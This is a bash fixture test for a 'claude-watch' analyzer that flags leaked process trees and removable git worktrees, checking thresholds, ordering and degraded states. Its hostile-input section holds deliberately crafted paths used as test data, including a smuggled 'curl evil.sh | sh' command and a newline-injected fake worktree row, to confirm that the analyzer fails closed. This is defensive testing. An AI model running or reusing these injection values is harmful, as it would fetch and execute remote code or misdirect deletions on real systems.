#!/usr/bin/env bash
# Fixture test for the leaks analyzer (tools/advise-leaks.sh, plan §6 U5).
#
# The shebang is load-bearing (handoff §4.15): zsh does not word-split unquoted
# variables, so this must be a FILE run under bash, never pasted into a shell.
#
# Hermetic by construction. Every threshold case is driven through the PURE
# `leaks_findings()` half against captured scan output written into a mktemp
# sandbox — no ps, no lsof, no git, no live scan anywhere. That is the entire
# reason §3b splits the analyzer in two: a live end-to-end run would go red the
# day an orphan actually leaks, which is the day the tool is needed.
#
# The one live thing here is deliberate and narrow: a column-count assertion
# against `scan_worktrees 7 | head -1` (§3d). The captured fixtures encode a
# 9-column shape; if the parent function ever grows or loses a column, this
# fails loudly instead of every threshold passing against a shape that no
# longer exists.
set -uo pipefail

REPO="$(cd "$(dirname "${BASH_SOURCE[0]:-$0}")/.." && pwd)"
pass=0; fail=0; skip=0
ok()  { pass=$((pass + 1)); printf '  \033[32mok\033[0m    %s\n' "$1"; }
bad() { fail=$((fail + 1)); printf '  \033[31mFAIL\033[0m  %s\n' "$1"; }
skp() { skip=$((skip + 1)); printf '  \033[90mskip\033[0m  %s\n' "$1"; }

# shellcheck source=../tools/advise-leaks.sh
. "$REPO/tools/advise-leaks.sh" || { echo "cannot source tools/advise-leaks.sh"; exit 1; }

TMP=$(mktemp -d) || exit 1
trap 'rm -rf "$TMP"' EXIT

TAB=$(printf '\t')
NOW_OUT=""

# Denominators are environment (§3a). Default every case to "absent" and let the
# cases that care set them, because absent is the state the real machine is in
# until a disk scan has ever run.
unset CW_MEMSIZE_KB CW_VOLUME_TOTAL_KB
unset CLAUDE_WATCH_LEAKS_ORPHAN_WARN_HOURS CLAUDE_WATCH_LEAKS_ORPHAN_WARN_MB
unset CLAUDE_WATCH_LEAKS_WORKTREE_WARN_GIB

# --------------------------------------------------------------- utilities --
# run <orphan-rows|-> <worktree-rows|->   ("-" means that scan could not run)
#
# Captured scan output goes through the aggregators and then the pure half,
# which is exactly the path advise_leaks takes — minus the scans.
run() {
  local o=$1 w=$2 ov= wv=
  if [ "$o" != "-" ]; then printf '%s' "$o" > "$TMP/o.tsv"; ov=$(leaks_agg_orphans "$TMP/o.tsv"); fi
  if [ "$w" != "-" ]; then printf '%s' "$w" > "$TMP/w.tsv"; wv=$(leaks_agg_worktrees "$TMP/w.tsv"); fi
  NOW_OUT=$(leaks_findings "$ov" "$wv")
}
# runv <orphan-values|""> <worktree-values|"">  — the pure half on its own, no
# file anywhere near it. If leaks_findings ever starts reading the filesystem
# again these calls are what break.
runv() { NOW_OUT=$(leaks_findings "$1" "$2"); }
srow()  { printf '%s\n' "$NOW_OUT" | LC_ALL=C awk -F'\t' '$1 == "S"'; }
frow()  { printf '%s\n' "$NOW_OUT" | CW_ID="$1" LC_ALL=C awk -F'\t' 'BEGIN { i = ENVIRON["CW_ID"] } $1 == "F" && $3 == i'; }
field() { printf '%s\n' "$1" | CW_N="$2" LC_ALL=C awk -F'\t' 'BEGIN { n = ENVIRON["CW_N"] } { print $n }'; }
nf()    { printf '%s\n' "$1" | LC_ALL=C awk -F'\t' '{ print NF }'; }
nfrows(){ printf '%s\n' "$NOW_OUT" | LC_ALL=C awk -F'\t' '$1 == "F"' | grep -c . ; }

eq() {  # <desc> <got> <want>
  if [ "$2" = "$3" ]; then ok "$1"; else bad "$1 (got [$2], wanted [$3])"; fi
}

# Orphan T row: T <root_pid> <name> <age_s> <subtree_rss_kb> <nproc> <subtree_cpu>
t_row() { printf 'T\t%s\t%s\t%s\t%s\t%s\t%s\n' "$1" "$2" "$3" "$4" "${5:-1}" "${6:-0.0}"; }
# Worktree row: <status> <path> <main> <branch> <age_days> <dirty> <unpushed> <size_kb> <why>
w_row() { printf '%s\t%s\t/repo\t%s\t%s\t0\t0\t%s\t%s\n' "$1" "$2" "${3:-agent/x}" "${4:-30}" "$5" "${6:-clean}"; }

echo "leaks: severity from (value, threshold)"

# 2-hour, 300M tree — over the MB line, nowhere near the 24h line. warn.
run "$(t_row 111 node 7200 307200 3 1.5)" ""
eq "2h 300M tree -> warn"          "$(field "$(frow leaks.orphans)" 4)" warn
eq "  ... names the knob that fired" "$(field "$(frow leaks.orphans)" 9)" CLAUDE_WATCH_LEAKS_ORPHAN_WARN_MB
eq "  ... domain severity follows"   "$(field "$(srow)" 3)" warn

# 10-minute, 5M tree — under both lines but it exists at all. info.
run "$(t_row 222 vite 600 5120 1 0.1)" ""
eq "10m 5M tree -> info"           "$(field "$(frow leaks.orphans)" 4)" info
# partial, not complete: no CW_MEMSIZE_KB is set in this run, so the share was
# suppressed rather than computed and the S row has to say so (§3a).
eq "  ... state records the absent denominator" "$(field "$(srow)" 4)" partial

# An old but tiny tree: the age line alone is enough. `or`, not `and` (§5).
run "$(t_row 333 python3 90000 4096 1 0.0)" ""
eq "25h 4M tree -> warn (age alone)" "$(field "$(frow leaks.orphans)" 4)" warn
eq "  ... reports the hours knob"    "$(field "$(frow leaks.orphans)" 9)" CLAUDE_WATCH_LEAKS_ORPHAN_WARN_HOURS
eq "  ... in seconds"                "$(field "$(frow leaks.orphans)" 7)" seconds

echo "leaks: boundaries, either side"

run "$(t_row 1 node 600 204799)" ""          # one KiB under
eq "orphan 200M minus 1K -> info"  "$(field "$(frow leaks.orphans)" 4)" info
run "$(t_row 1 node 600 204800)" ""          # exactly 200M
eq "orphan 200M exactly -> warn"   "$(field "$(frow leaks.orphans)" 4)" warn
run "$(t_row 1 node 600 204801)" ""          # one KiB over
eq "orphan 200M plus 1K -> warn"   "$(field "$(frow leaks.orphans)" 4)" warn

run "$(t_row 1 node 86399 1024)" ""          # one second under
eq "orphan 24h minus 1s -> info"   "$(field "$(frow leaks.orphans)" 4)" info
run "$(t_row 1 node 86400 1024)" ""          # exactly 24h
eq "orphan 24h exactly -> warn"    "$(field "$(frow leaks.orphans)" 4)" warn
run "$(t_row 1 node 86401 1024)" ""          # one second over
eq "orphan 24h plus 1s -> warn"    "$(field "$(frow leaks.orphans)" 4)" warn

run "" "$(w_row STALE /a/wt1 '' '' 1048575)"     # one KiB under
eq "worktree 1GiB minus 1K -> info" "$(field "$(frow leaks.worktrees)" 4)" info
run "" "$(w_row STALE /a/wt1 '' '' 1048576)"     # exactly 1 GiB
eq "worktree 1GiB exactly -> warn" "$(field "$(frow leaks.worktrees)" 4)" warn
run "" "$(w_row STALE /a/wt1 '' '' 1048577)"     # one KiB over
eq "worktree 1GiB plus 1K -> warn" "$(field "$(frow leaks.worktrees)" 4)" warn

# The knobs actually move the line they name. Assigned on their own line and
# unset again, never as a `VAR=x run ...` prefix: bash keeps an assignment that
# prefixes a FUNCTION call in the shell afterwards, so the prefix form would
# silently retune every case below it.
CLAUDE_WATCH_LEAKS_ORPHAN_WARN_MB=100
run "$(t_row 1 node 600 153600)" ""
eq "ORPHAN_WARN_MB=100 promotes 150M" "$(field "$(frow leaks.orphans)" 4)" warn
unset CLAUDE_WATCH_LEAKS_ORPHAN_WARN_MB

CLAUDE_WATCH_LEAKS_WORKTREE_WARN_GIB=4
run "" "$(w_row STALE /a/wt1 '' '' 2097152)"
eq "WORKTREE_WARN_GIB=4 demotes 2GiB"  "$(field "$(frow leaks.worktrees)" 4)" info
unset CLAUDE_WATCH_LEAKS_WORKTREE_WARN_GIB

# is_uint discipline: a typoed knob is not rounded into a working threshold.
for badval in 2.5 -1 abc ' ' 1e3; do
  ( CLAUDE_WATCH_LEAKS_ORPHAN_WARN_MB="$badval" leaks_findings "1	0	0	0	0	1	0	node" "" ) >/dev/null 2>&1
  eq "knob \"$badval\" exits 2" "$?" 2
done

# A leading zero is a valid integer to is_uint and invalid octal to bash
# arithmetic, so `08` used to kill the function with status 1 — a crash where
# the spec asks for either a working threshold or exit 2. It works, in base 10.
CLAUDE_WATCH_LEAKS_ORPHAN_WARN_HOURS=08
run "$(t_row 1 node 32400 1024)" ""              # 9h, over an 8h line
eq "knob 08 is read as 8, not octal"  "$(field "$(frow leaks.orphans)" 4)" warn
eq "  ... and prints the base-10 threshold" "$(field "$(frow leaks.orphans)" 8)" 28800
run "$(t_row 1 node 25200 1024)" ""              # 7h, under an 8h line
eq "  ... 7h under an 08h line -> info" "$(field "$(frow leaks.orphans)" 4)" info
unset CLAUDE_WATCH_LEAKS_ORPHAN_WARN_HOURS

CLAUDE_WATCH_LEAKS_WORKTREE_WARN_GIB=01
( leaks_findings "" "1	1048576	0	1048576	0	/a/wt" ) >/dev/null 2>&1
eq "knob 01 does not crash the run" "$?" 0
unset CLAUDE_WATCH_LEAKS_WORKTREE_WARN_GIB

echo "leaks: ordering (§4)"

# (severity_rank desc, share_of_domain desc, id asc). Emission order is orphans
# then worktrees, so an info orphan beside a warn worktree is the case that
# catches "we just print them in the order we built them".
run "$(t_row 1 node 600 5120)" "$(w_row STALE /a/wt1 '' '' 2097152)"
eq "warn worktree sorts above info orphan" \
   "$(printf '%s\n' "$NOW_OUT" | LC_ALL=C awk -F'\t' '$1 == "F" { print $3 }' | head -n1)" leaks.worktrees
eq "  ... both findings still emitted" "$(nfrows)" 2

# Equal severity and equal share (both 0, no denominators): the third key
# decides, and without it this row order is whatever the code happened to do.
run "$(t_row 1 node 600 5120)" "$(w_row STALE /a/wt1 '' '' 4096)"
eq "equal severity, equal share -> id ascending" \
   "$(printf '%s\n' "$NOW_OUT" | LC_ALL=C awk -F'\t' '$1 == "F" { print $3 }' | tr '\n' ' ')" \
   "leaks.orphans leaks.worktrees "

# Equal severity, different share: the share key decides before the id key.
CW_MEMSIZE_KB=1048576; CW_VOLUME_TOTAL_KB=104857600
run "$(t_row 1 node 600 5120)" "$(w_row STALE /a/wt1 '' '' 4096)"
eq "equal severity -> larger share first" \
   "$(printf '%s\n' "$NOW_OUT" | LC_ALL=C awk -F'\t' '$1 == "F" { print $3 }' | head -n1)" leaks.orphans
unset CW_MEMSIZE_KB CW_VOLUME_TOTAL_KB

echo "leaks: the pure half is pure"

# No file exists anywhere in these two calls. Same values in, same rows out.
runv "2	307200	7200	307200	7200	11	0	node" ""
eq "values straight into leaks_findings" "$(field "$(frow leaks.orphans)" 4)" warn
A=$NOW_OUT
runv "2	307200	7200	307200	7200	11	0	node" ""
eq "  ... and it is deterministic" "$NOW_OUT" "$A"

echo "leaks: what it consumes, and what it must not"

# Removable is the parent's classification, consumed as-is (§3d). ACTIVE and
# UNSAFE never enter a reclaim total, so no finding can point at a live agent
# or at unpublished work.
run "" "$(w_row STALE    /a/stale    '' '' 1048576
          w_row PRUNABLE /a/prunable '' '' 1048576
          w_row ACTIVE   /a/active   '' '' 9999999
          w_row UNSAFE   /a/unsafe   '' '' 9999999)"
eq "reclaim counts STALE+PRUNABLE only" "$(field "$(frow leaks.worktrees)" 6)" 2097152
eq "  ... and reports it as reclaim_kb" "$(field "$(frow leaks.worktrees)" 10)" 2097152

run "" "$(w_row ACTIVE /a/active '' '' 9999999
          w_row UNSAFE /a/unsafe '' '' 9999999)"
eq "no removable -> no worktree finding" "$(nfrows)" 0
eq "  ... and the domain reads ok"       "$(field "$(srow)" 3)" ok

echo "leaks: degradation"

run "" ""
S=$(srow)
eq "empty scans -> S leaks ok"        "$(field "$S" 3)" ok
eq "  ... complete"                   "$(field "$S" 4)" complete
eq "  ... no reasons"                 "$(field "$S" 5)" ""
eq "  ... the exact sentence"         "$(field "$S" 6)" "no leaked processes, no removable worktrees"
eq "  ... no remedy"                  "$(field "$S" 7)" ""
eq "  ... zero findings"              "$(nfrows)" 0
eq "  ... seven fields"               "$(nf "$S")" 7

run - -
S=$(srow)
eq "no scan at all -> unknown"        "$(field "$S" 3)" unknown
eq "  ... unavailable"                "$(field "$S" 4)" unavailable
eq "  ... never ok, never a finding"  "$(nfrows)" 0
if [ -n "$(field "$S" 7)" ]; then ok "  ... carries a remedy"; else bad "  ... carries a remedy"; fi

run - "$(w_row STALE /a/wt1 '' '' 4096)"
S=$(srow)
eq "one scan missing -> partial"      "$(field "$S" 4)" partial
eq "  ... with both reasons, in §3e order" "$(field "$S" 5)" "cache_missing,scan_permission_denied"
# The invariant, asserted the other way round too: partial is measured, so it
# may not claim unknown, and a measured half may still report its findings.
if [ "$(field "$S" 3)" != unknown ]; then ok "  ... partial is never unknown"; else bad "  ... partial is never unknown"; fi

echo "leaks: shares and the missing denominator (§3a)"

# Both denominators absent — the live state until a disk scan has ever run.
run "$(t_row 1 node 600 307200)" "$(w_row STALE /a/wt1 '' '' 1048576)"
eq "orphan share with no CW_MEMSIZE_KB"      "$(field "$(frow leaks.orphans)" 5)" 0
eq "worktree share with no CW_VOLUME_TOTAL_KB" "$(field "$(frow leaks.worktrees)" 5)" 0
# Emitting 0 is half of §3a; saying so is the other half. A consumer that reads
# share 0 on a `complete` domain reads "negligible", not "never measured".
S=$(srow)
eq "  ... and the domain says it is partial" "$(field "$S" 4)" partial
eq "  ... naming both absent denominators"   "$(field "$S" 5)" "no_samples,cache_missing"
if [ -n "$(field "$S" 7)" ]; then ok "  ... with a remedy"; else bad "  ... with a remedy"; fi
eq "  ... severity still from the absolute line" "$(field "$S" 3)" warn

# One denominator present, one absent: only the absent one is named.
CW_MEMSIZE_KB=16777216
run "$(t_row 1 node 600 307200)" "$(w_row STALE /a/wt1 '' '' 1048576)"
eq "only the missing denominator is reported" "$(field "$(srow)" 5)" cache_missing
unset CW_MEMSIZE_KB

# Both present: nothing was suppressed, so the domain is complete again.
CW_MEMSIZE_KB=16777216; CW_VOLUME_TOTAL_KB=442287516
run "$(t_row 1 node 600 307200)" "$(w_row STALE /a/wt1 '' '' 1048576)"
eq "both denominators -> complete"           "$(field "$(srow)" 4)" complete
eq "  ... and no reasons"                    "$(field "$(srow)" 5)" ""
unset CW_MEMSIZE_KB CW_VOLUME_TOTAL_KB
CW_VOLUME_TOTAL_KB=0; CW_MEMSIZE_KB=0
run "$(t_row 1 node 600 307200)" "$(w_row STALE /a/wt1 '' '' 1048576)"
eq "zero denominator is not divided by"      "$(field "$(frow leaks.orphans)" 5)" 0
eq "  ... nor the worktree one"              "$(field "$(frow leaks.worktrees)" 5)" 0

CW_MEMSIZE_KB=16777216; CW_VOLUME_TOTAL_KB=442287516
run "$(t_row 1 node 600 307200)" "$(w_row STALE /a/wt1 '' '' 1048576)"
eq "orphan share with a denominator"         "$(field "$(frow leaks.orphans)" 5)" 0.0183
eq "worktree share with a denominator"       "$(field "$(frow leaks.worktrees)" 5)" 0.0024

# "still parses" means exactly that: no nan, no inf, nothing a JSON reader
# rejects. Assert it with a JSON reader rather than by eyeballing the string.
if command -v python3 >/dev/null 2>&1; then
  unset CW_MEMSIZE_KB CW_VOLUME_TOTAL_KB
  run "$(t_row 1 node 600 307200)" "$(w_row STALE /a/wt1 '' '' 1048576)"
  if printf '%s\n' "$NOW_OUT" | python3 -c '
import json, sys
n = 0
for line in sys.stdin:
    f = line.rstrip("\n").split("\t")
    if f[0] != "F":
        continue
    n += 1
    # share, value, threshold, reclaim_kb must be JSON numbers, never nan/inf.
    for i in (4, 5, 7, 9):
        v = json.loads(f[i])
        if not isinstance(v, (int, float)) or v != v or v in (float("inf"), float("-inf")):
            raise SystemExit("bad number: " + f[i])
    if not 0 <= json.loads(f[4]) <= 1:
        raise SystemExit("share out of range")
sys.exit(0 if n == 2 else 1)
' 2>/dev/null; then ok "numeric fields are JSON numbers with no denominators"
  else bad "numeric fields are JSON numbers with no denominators"; fi
else
  skp "JSON number check (no python3)"
fi

echo "leaks: hostile text (§3b)"

# §3b, the field-stripper itself: a tab reaching the emitter has already
# mis-split the row, so severity reads as a number and the finding is silently
# garbage. Tabs, newlines and other control bytes all become spaces.
eq "clean() flattens tab, newline and control bytes" \
   "$(leaks_clean "$(printf 'a\tb\nc\001d\177e')")" "a b c d e"

# A tab inside a P row argv is the realistic hostile input: argv is arbitrary
# bytes and the parent emits it last on the line. Nothing here reads P rows —
# every number comes off the T row — and this is the assertion that goes red the
# day someone starts reading them without care.
run "$(t_row 1 node 600 307200 3
       printf 'P\t1\t1\t0\t307200\t600\tnode --flag\targv\twith\ttabs\n')" ""
F=$(frow leaks.orphans)
eq "tab in an argv: 14 fields out"        "$(nf "$F")" 14
eq "  ... S row still 7 fields"           "$(nf "$(srow)")" 7
eq "  ... P rows never enter the total"   "$(field "$F" 6)" 307200
eq "  ... one tree, not four"             "$(printf '%s' "$F" | grep -c '1 leaked process tree,')" 1

echo "leaks: unsplittable rows are never guessed at (§3d)"

# THE defect this section exists for. `scan_worktrees` emits raw paths, so a tab
# in a path splits one row into ten fields and $2 becomes a PREFIX of the real
# path. Trusting field positions here prints a reap command naming
# /Users/safe — a real, different, innocent-looking directory — for a worktree
# that actually lives somewhere else. The field count is checked before any
# field is read.
run "" "$(w_row STALE "$(printf '/Users/safe\tevil')" '' '' 4096)"
F=$(frow leaks.worktrees)
eq "tab in a worktree path: the prefix is never named" \
   "$(printf '%s' "$F" | grep -c '/Users/safe')" 0
eq "  ... no command printed"        "$(field "$F" 14 | grep -c 'claude-watch-reap')" 0
eq "  ... says the listing cannot be trusted" \
   "$(field "$F" 14 | grep -c 'could not be trusted')" 1
eq "  ... excluded from the reclaim total" "$(field "$F" 10)" 0
eq "  ... domain is partial"         "$(field "$(srow)" 4)" partial
eq "  ... reason recorded"           "$(field "$(srow)" 5)" scan_malformed

# A newline in a path is worse: it arrives as two rows, neither of which has the
# §3d shape. Both are counted and skipped. (A newline crafted to inject a whole
# well-formed 9-field row is indistinguishable from a real one at this layer —
# the scanner is where that is stopped — but the broken first half still makes
# the domain say cache_malformed, so it can never pass silently.)
run "" "$(w_row STALE "$(printf '/Users/safe\nevil')" '' '' 4096)"
eq "newline in a worktree path: no command" \
   "$(field "$(frow leaks.worktrees)" 14 | grep -c 'claude-watch-reap')" 0
eq "  ... both halves counted unparsable" \
   "$(field "$(frow leaks.worktrees)" 12 | grep -c '2 unrepresentable rows')" 1

# A good row beside a bad one gets NO command either, and no total. Once one
# row is unrepresentable, the plausible row beside it may be the fabrication —
# that is exactly how a newline injects one. Publishing the smaller total
# instead would be a lie with a decimal point on it.
run "" "$(w_row STALE /a/good '' '' 4096
          w_row STALE "$(printf '/a/b\tc')" '' '' 999999)"
F=$(frow leaks.worktrees)
eq "good row beside a bad one: still no command" \
   "$(field "$F" 14 | grep -c 'claude-watch-reap')" 0
eq "  ... and the good path is not named"  "$(printf '%s' "$F" | grep -c '/a/good')" 0
eq "  ... no reclaim total is published"   "$(field "$F" 10)" 0
eq "  ... value is 0 too"                  "$(field "$F" 6)" 0
eq "  ... share cannot be nonzero"         "$(field "$F" 5)" 0
eq "  ... and the headline says why"       "$(field "$F" 12 | grep -c 'listing unusable')" 1

# THE injection. A newline in a directory name splits one worktree across two
# physical lines, and the tail can be crafted to present as a complete,
# PLAUSIBLE nine-field STALE row naming a path the attacker chose. Field count
# cannot catch that — the crafted row has nine fields. Two things do: the
# content check rejects a row assembled out of a path fragment, and the
# fail-closed rule means the malformed sibling alone kills every action in the
# scan.
inject=$(printf 'STALE\t/Users/turbokach/Dev/repo/.claude/worktrees/a\nSTALE\t/Users/turbokach/Dev/evil\t/repo\tagent/x\t99\t0\t0\t9999999\tclean\t/repo\tagent/x\t99\t0\t0\t4096\tclean\n')
run "" "$inject"
F=$(frow leaks.worktrees)
eq "newline-injected plausible row: no action"  "$(field "$F" 14 | grep -c 'claude-watch-reap')" 0
eq "  ... the injected path is never named"     "$(printf '%s' "$F" | grep -c '/Dev/evil')" 0
eq "  ... contributes to no total"              "$(field "$F" 10)" 0
eq "  ... and to no value"                      "$(field "$F" 6)" 0
eq "  ... domain is partial, not complete"      "$(field "$(srow)" 4)" partial
eq "  ... with scan_malformed"                  "$(field "$(srow)" 5)" scan_malformed
eq "  ... and never warn on an untrusted total" "$(field "$F" 4)" info

# The content gate on its own: a nine-field row whose status is a path fragment,
# and one whose size column is not a number. Both are shapes a split path
# produces and a real scan never does.
run "" "$(printf 'usr/local/bin\t/a/wt\t/repo\tagent/x\t30\t0\t0\t4096\tclean\n')"
eq "nine fields, bogus status -> unrepresentable" \
   "$(field "$(frow leaks.worktrees)" 12 | grep -c 'listing unusable')" 1
run "" "$(printf 'STALE\t/a/wt\t/repo\tagent/x\t30\t0\t0\tnot-a-number\tclean\n')"
eq "nine fields, non-numeric size -> unrepresentable" \
   "$(field "$(frow leaks.worktrees)" 12 | grep -c 'listing unusable')" 1

# Same gate on the orphan side: a T row is 7 fields, and a name carrying a tab
# shifts every number after it.
run "$(t_row 1 "$(printf 'node\tevil')" 600 307200)" ""
eq "malformed T row is skipped, not mis-parsed" "$(nfrows)" 0
eq "  ... and the domain is partial"            "$(field "$(srow)" 4)" partial
eq "  ... rather than ok"                       "$(field "$(srow)" 3)" ok

# A control byte inside a path, on the other hand, is NOT a separator: it
# survives the split and reaches the emitted action intact unless it is scrubbed.
run "" "$(w_row STALE "$(printf '/a/wt\001x')" '' '' 4096)"
F=$(frow leaks.worktrees)
eq "control byte in a path: 14 fields out" "$(nf "$F")" 14
eq "  ... scrubbed out of the action"      "$(field "$F" 14 | LC_ALL=C grep -c '[[:cntrl:]]')" 0
eq "  ... and reported for manual handling" "$(field "$F" 14 | grep -c '/a/wt x — path needs manual handling')" 1

# A path outside the safe charset gets no command at all — a correctly quoted
# `rm -rf 'x; curl evil.sh | sh'` is safe to run and still a terrible thing to
# hand someone to paste.
run "" "$(w_row STALE '/a/wt; curl evil.sh | sh' '' '' 4096)"
A=$(field "$(frow leaks.worktrees)" 14)
if printf '%s' "$A" | grep -q 'claude-watch-reap'; then bad "metachar path: no command printed"; else ok "metachar path: no command printed"; fi
eq "  ... says so"                        "$(printf '%s' "$A" | grep -c 'path needs manual handling')" 1
eq "  ... action is still one field"      "$(nf "$(frow leaks.worktrees)")" 14

run "" "$(w_row STALE '/Users/x/Dev/wt 1' '' '' 4096)"
A=$(field "$(frow leaks.worktrees)" 14)
eq "safe path: quoted, and points at the reap skill" \
   "$(printf '%s' "$A" | grep -c "/claude-watch-reap.*'/Users/x/Dev/wt 1'")" 1
if printf '%s' "$A" | grep -qE -- '--kill|--remove|rm -rf'; then
  bad "  ... never a destructive command"
else
  ok "  ... never a destructive command"
fi

run "$(t_row 1 node 600 307200)" ""
eq "orphan action points at the reap skill" \
   "$(printf '%s' "$(field "$(frow leaks.orphans)" 14)" | grep -c '/claude-watch-reap')" 1

echo "scan_worktrees: unrepresentable paths at the source (upstream half)"

# Downstream refusal is the second layer; this is the first. `scan_worktrees`
# reads records with `IFS=<tab> read`, so a tab inside a real directory name
# used to shift `path` to a PREFIX before any consumer saw the row — and `git
# -C`, `du` and the removal offer then all acted on the wrong directory. This
# builds that directory for real and asserts the scanner refuses to represent
# it, rather than asserting it against a hand-written fixture that cannot prove
# the shift ever happened.
if ! command -v git >/dev/null 2>&1; then
  skp "scan_worktrees unrepresentable-path handling (no git)"
else
  UP="$TMP/upstream"
  mkdir -p "$UP/home" "$UP/empty"
  : > "$UP/gitconfig-global"
  (
    # Hermetic: no user hooks, no template dir, no real HOME (the same isolation
    # tests/fixture-worktree-unpushed.sh documents at length).
    export HOME="$UP/home" \
           GIT_CONFIG_GLOBAL="$UP/gitconfig-global" GIT_CONFIG_SYSTEM=/dev/null \
           GIT_CONFIG_NOSYSTEM=1 GIT_TERMINAL_PROMPT=0 \
           GIT_AUTHOR_NAME=t GIT_AUTHOR_EMAIL=t@t GIT_COMMITTER_NAME=t GIT_COMMITTER_EMAIL=t@t
    R="$UP/roots/repo"
    mkdir -p "$R" && cd "$R" || exit 1
    git init -q . && git commit -q --allow-empty -m init
    git -c core.hooksPath="$UP/empty" -c init.templateDir="$UP/empty" \
        worktree add -q -b agent/tabbed "$R/.claude/worktrees/$(printf 'a\tb')" >/dev/null 2>&1
    git -c core.hooksPath="$UP/empty" -c init.templateDir="$UP/empty" \
        worktree add -q -b agent/gone "$R/.claude/worktrees/gone" >/dev/null 2>&1
    rm -rf "$R/.claude/worktrees/gone"     # would be PRUNABLE on a clean scan
    set -- --help
    # shellcheck source=../claude-watch
    . "$REPO/claude-watch" >/dev/null 2>&1
    CLAUDE_WATCH_REPO_ROOTS="$UP/roots" scan_worktrees 7
  ) > "$UP/out.tsv" 2>/dev/null

  if [ ! -s "$UP/out.tsv" ]; then
    skp "scan_worktrees unrepresentable-path sandbox (git worktree add refused the path)"
  else
    eq "tabbed path is reported unrepresentable" \
       "$(grep -c 'worktree record is unrepresentable' "$UP/out.tsv")" 1
    eq "  ... as UNSAFE, never removable" \
       "$(LC_ALL=C awk -F'\t' '$9 ~ /record is unrepresentable/ { print $1 }' "$UP/out.tsv")" UNSAFE
    eq "  ... every emitted row still has 9 fields" \
       "$(LC_ALL=C awk -F'\t' 'NF != 9 { n++ } END { print n + 0 }' "$UP/out.tsv")" 0
    eq "  ... no raw control byte survives into the row" \
       "$(LC_ALL=C awk -F'\t' '$9 ~ /record is unrepresentable/ { print $2 }' "$UP/out.tsv" | LC_ALL=C grep -c '[[:cntrl:]]')" 0
    # The taint rule: one unrepresentable record means a deleted worktree can no
    # longer be offered as PRUNABLE, because a crafted newline presents its tail
    # as exactly that — a plausible row for a path that does not exist.
    eq "  ... and PRUNABLE is withheld for the tainted scan" \
       "$(grep -c '^PRUNABLE' "$UP/out.tsv")" 0
    eq "  ... the deleted worktree is still reported" \
       "$(grep -c 'cannot be trusted' "$UP/out.tsv")" 1
    # The scanner having sanitised at the source, the analyzer sees only
    # well-formed UNSAFE rows: nothing removable, no finding, no command, and
    # no unrepresentable rows left for it to fail closed on. Both layers agree.
    W=$(leaks_agg_worktrees "$UP/out.tsv")
    NOW_OUT=$(leaks_findings "" "$W")
    eq "  ... analyzer sees nothing removable"  "$(nfrows)" 0
    eq "  ... and emits no command at all"      "$(printf '%s' "$NOW_OUT" | grep -c 'claude-watch-reap')" 0
    eq "  ... and no unparsable rows remain"    "$(printf '%s' "$W" | LC_ALL=C awk -F'\t' '{print $5}')" 0
  fi
fi

echo "leaks: live shape (§3d)"

# Captured fixtures encode a 9-column worktree row. If scan_worktrees drifts,
# every assertion above would keep passing against a shape that no longer
# exists — so ask the live function what it emits today.
(
  set -- --help
  # shellcheck source=../claude-watch
  . "$REPO/claude-watch" >/dev/null 2>&1
  init_live_cwds
  scan_worktrees 7 2>/dev/null | head -n1
) > "$TMP/live-wt.tsv" 2>/dev/null
if [ -s "$TMP/live-wt.tsv" ]; then
  eq "live scan_worktrees emits 9 columns" "$(nf "$(cat "$TMP/live-wt.tsv")")" 9
else
  skp "live scan_worktrees column count (no agent worktrees on this machine)"
fi

printf '%d passed, %d failed, %d skipped\n' "$pass" "$fail" "$skip"
[ "$fail" -eq 0 ]
